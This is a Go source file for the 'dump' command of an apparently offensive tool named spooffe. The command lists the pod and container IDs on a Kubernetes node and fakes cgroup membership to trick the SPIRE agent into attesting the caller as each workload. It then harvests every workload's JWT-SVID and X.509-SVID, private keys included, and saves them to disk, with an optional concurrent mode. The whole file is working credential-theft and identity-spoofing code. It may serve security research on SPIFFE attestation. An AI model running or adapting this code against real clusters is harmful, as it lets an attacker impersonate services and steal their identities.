// cmd/dump/dump.go
package dump

// TODO: Add option to dump spoof all the folders
import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"spooffe/cmd/dump/agentkey"
	"spooffe/extractor"
	"spooffe/spiffe"
	"spooffe/utils"
	"strconv"
	"sync"

	"github.com/spf13/cobra"
)

type PodLog struct {
	PodUID      string
	ContainerID string
	Logs        []string
}

var (
	dumpSource string
	fetchJWT   bool
	fetchX509  bool
	concurrent bool
	outputMode string
	socketPath string
	timeoutSec int
)

const (
	svidsDir = "output/svids"
)

// var dumpCmd = &cobra.Command{
// 	Use:   "dump",
// 	Short: "Spoof cgroups and dump SVIDs",
// 	Run: func(cmd *cobra.Command, args []string) {
// 		os.MkdirAll(svidsDir, 0755)
// 		if !fetchJWT && !fetchX509 {
// 			fetchJWT, fetchX509 = true, true
// 		}

// 		var pairs []extractor.PodContainerPair
// 		title := "Scan containers from /sys/fs/cgroup/kubepods.slice"
// 		if dumpSource == "proc" {
// 			pairs = extractor.ExtractFromProcCgroup()
// 			title = "Scan containers from /proc/<pid>/cgroup"
// 		} else {
// 			pairs = extractor.ExtractFromSysfs()
// 		}

// 		utils.PrintPairs(title, pairs)

// 		if concurrent {
// 			runConcurrent(pairs)
// 		} else {
// 			runSync(pairs)
// 		}
// 	},
// }

func NewDumpCmd() *cobra.Command {
	dumpCmd := &cobra.Command{
		Use:   "dump",
		Short: "Spoof cgroups and dump SVIDs",
		Run: func(cmd *cobra.Command, args []string) {
			_ = os.MkdirAll(svidsDir, 0755)

			// default: dump both if neither explicitly requested
			if !fetchJWT && !fetchX509 {
				fetchJWT, fetchX509 = true, true
			}

			var pairs []extractor.PodContainerPair
			title := "Scan containers from /sys/fs/cgroup/kubepods.slice"
			if dumpSource == "proc" {
				pairs = extractor.ExtractFromProcCgroup()
				title = "Scan containers from /proc/<pid>/cgroup"
			} else {
				pairs = extractor.ExtractFromSysfs()
			}

			utils.PrintPairs(title, pairs)

			if concurrent {
				runConcurrent(pairs)
			} else {
				runSync(pairs)
			}
		},
	}

	// Add the agentkey subcommand
	dumpCmd.AddCommand(agentkey.NewAgentKeyCmd())

	// Flags live on the command (constructor style)
	dumpCmd.Flags().BoolVar(&fetchJWT, "jwt", false, "Fetch JWT-SVID only")
	dumpCmd.Flags().BoolVar(&fetchX509, "x509", false, "Fetch X.509-SVID only")
	dumpCmd.Flags().StringVar(&dumpSource, "source", "sysfs", "Source of container data: sysfs or proc")
	dumpCmd.Flags().BoolVar(&concurrent, "concurrent", false, "Enable concurrent fetching of SVIDs")
	dumpCmd.Flags().StringVar(&outputMode, "output", "both", "Output mode: print, save, or both")
	dumpCmd.Flags().IntVar(&timeoutSec, "timeout", 10, "Timeout (in seconds) for fetching SVIDs")
	dumpCmd.Flags().StringVarP(&socketPath, "socket", "s", "/run/spire/sockets/agent.sock", "Path to SPIRE agent socket")

	return dumpCmd
}

// func NewDumpCmd() *cobra.Command {
// 	var dumpCmd = &cobra.Command{
// 		Use:   "dump",
// 		Short: "Spoof cgroups and dump SVIDs",
// 		Run: func(cmd *cobra.Command, args []string) {
// 			os.MkdirAll(svidsDir, 0755)
// 			if !fetchJWT && !fetchX509 {
// 				fetchJWT, fetchX509 = true, true
// 			}

// 			var pairs []extractor.PodContainerPair
// 			title := "Scan containers from /sys/fs/cgroup/kubepods.slice"
// 			if dumpSource == "proc" {
// 				pairs = extractor.ExtractFromProcCgroup()
// 				title = "Scan containers from /proc/<pid>/cgroup"
// 			} else {
// 				pairs = extractor.ExtractFromSysfs()
// 			}

// 			utils.PrintPairs(title, pairs)

// 			if concurrent {
// 				runConcurrent(pairs)
// 			} else {
// 				runSync(pairs)
// 			}
// 		},
// 	}

// 	return dumpCmd

// }

func runSync(pairs []extractor.PodContainerPair) {
	for _, pair := range pairs {
		utils.Log("Pod UID:", pair.PodUID, "info")
		utils.Log("Container ID:", pair.ContainerID, "info")

		groupPath, err := spiffe.SpoofCgroup(pair.PodUID, pair.ContainerID)
		if err != nil {
			utils.Log("Failed to spoof cgroup", err, "error")
			continue
		}
		utils.Log("Created cgroup at", groupPath, "info")

		var logs []string

		if fetchJWT {
			//token, err := spiffe.FetchJWT(pair)
			token, err := spiffe.FetchJWT(pair, socketPath, timeoutSec)
			if err != nil {
				logs = append(logs, utils.FormatLogLine("Failed to fetch JWT:", err, "error"))
			} else {
				logs = append(logs, utils.FormatLogLine("Fetched JWT:", token, "success"))
				if outputMode == "save" || outputMode == "both" {
					path := fmt.Sprintf("%s/pod_%s_container_%s_jwt.svid", svidsDir, pair.PodUID, pair.ContainerID)
					os.WriteFile(path, []byte(token), 0644)
				}
			}
		}
		if fetchX509 {
			certPEM, keyPEM, err := spiffe.FetchX509(pair, socketPath, timeoutSec)
			if err != nil {
				logs = append(logs, utils.FormatLogLine("Failed to fetch X509:", err, "error"))
			} else {
				logs = append(logs, utils.FormatLogLine("Fetched X509 SVID", nil, "success"))
				if outputMode == "save" || outputMode == "both" {
					certOut := fmt.Sprintf("%s/pod_%s_container_%s_x509_public.pem", svidsDir, pair.PodUID, pair.ContainerID)
					keyOut := fmt.Sprintf("%s/pod_%s_container_%s_x509_private.pem", svidsDir, pair.PodUID, pair.ContainerID)
					os.WriteFile(certOut, certPEM, 0644)
					os.WriteFile(keyOut, keyPEM, 0600)
				}
			}
		}

		if outputMode == "print" || outputMode == "both" {
			for _, line := range logs {
				fmt.Println(line)
			}
		}
		// if outputMode == "save" || outputMode == "both" {
		// 	filePath := fmt.Sprintf("output_%s_%s.log", pair.PodUID, pair.ContainerID)
		// 	os.WriteFile(filePath, []byte(fmt.Sprintln(logs)), 0644)
		// }
		fmt.Println()
	}
}

func runConcurrent(pairs []extractor.PodContainerPair) {
	var wg sync.WaitGroup

	for _, pair := range pairs {
		wg.Add(1)
		go func(p extractor.PodContainerPair) {
			defer wg.Done()

			cmd := exec.Command(os.Args[0], "child-dump",
				"--pod", p.PodUID,
				"--container", p.ContainerID,
				"--socket", socketPath,
				"--timeout", strconv.Itoa(timeoutSec), // Convert int to string
			)

			if fetchJWT {
				cmd.Args = append(cmd.Args, "--jwt")
			}
			if fetchX509 {
				cmd.Args = append(cmd.Args, "--x509")
			}

			out, err := cmd.Output()
			if err != nil {
				fmt.Println(utils.FormatLogLine("Error executing child for container", p.ContainerID, "error"))
				return
			}

			var result utils.PodLog
			if err := json.Unmarshal(out, &result); err != nil {
				fmt.Println(utils.FormatLogLine("Failed to parse child output for container", p.ContainerID, "error"))
				return
			}

			if outputMode == "print" || outputMode == "both" {
				fmt.Println(utils.FormatLogLine("Pod UID:", result.PodUID, "info"))
				fmt.Println(utils.FormatLogLine("Container ID:", result.ContainerID, "info"))
				for _, line := range result.Logs {
					fmt.Println(line)
				}
				fmt.Println()
			}
			if outputMode == "save" || outputMode == "both" {
				base := fmt.Sprintf("output_%s_%s.log", result.PodUID, result.ContainerID)
				fulleFilePath := filepath.Join(svidsDir, base)
				os.WriteFile(fulleFilePath, []byte(fmt.Sprintln(result.Logs)), 0644)
			}
		}(pair)
	}

	wg.Wait()
}

// func init() {
// 	//rootCmd.AddCommand(dumpCmd)
// 	dumpCmd.Flags().BoolVar(&fetchJWT, "jwt", false, "Fetch JWT-SVID only")
// 	dumpCmd.Flags().BoolVar(&fetchX509, "x509", false, "Fetch X.509-SVID only")
// 	dumpCmd.Flags().StringVar(&dumpSource, "source", "sysfs", "Source of container data: sysfs or proc")
// 	dumpCmd.Flags().BoolVar(&concurrent, "concurrent", false, "Enable concurrent fetching of SVIDs")
// 	dumpCmd.Flags().StringVar(&outputMode, "output", "both", "Output mode: print, save, or both")
// 	dumpCmd.Flags().IntVar(&timeoutSec, "timeout", 10, "Timeout (in seconds) for fetching SVIDs")
// 	dumpCmd.PersistentFlags().StringVarP(&socketPath, "socket", "s", "/run/spire/sockets/agent.sock", "Path to SPIRE agent socket")

// }
